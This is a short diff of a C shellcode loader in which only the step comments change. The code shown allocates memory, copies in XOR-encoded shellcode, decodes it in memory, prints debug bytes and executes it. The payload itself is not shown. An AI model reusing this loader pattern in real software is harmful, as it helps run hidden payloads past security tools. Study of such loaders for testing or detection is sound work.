@@ -62,15 +62,15 @@ int main(void)
 
     printf("[+] VirtualAlloc OK @ %p\n", exec_mem);
 
-    /* 2️ Copy XORed shellcode */
+    /* 2 Copy XORed shellcode */
     memcpy(exec_mem, xored_shellcode, xored_shellcode_len);
     printf("[+] Shellcode copied (%u bytes)\n", xored_shellcode_len);
 
-    /* 3️ Bytes before */
+    /* 3 Bytes before */
     printf("[+] Shellcode bytes BEFORE XOR: ");
     dump_bytes((unsigned char*)exec_mem, xored_shellcode_len);
 
-    /* 4️ Decrypt in memory */
+    /* 4 Decrypt in memory */
     xor_decrypt(
         (unsigned char*)exec_mem,
         xored_shellcode_len,
@@ -80,11 +80,11 @@ int main(void)
 
     printf("[+] XOR decryption done\n");
 
-    /* 5️ Bytes after decrypt [+] Debug */
+    /* 5 Bytes after decrypt [+] Debug */
     printf("[+] Shellcode bytes AFTER  XOR: ");
     dump_bytes((unsigned char*)exec_mem, xored_shellcode_len);
 
-    /* 6️ Execute shellcode */
+    /* 6 Execute shellcode */
     printf("[+] Executing shellcode...\n");
 
     void (*shellcode)() = (void (*)())exec_mem;
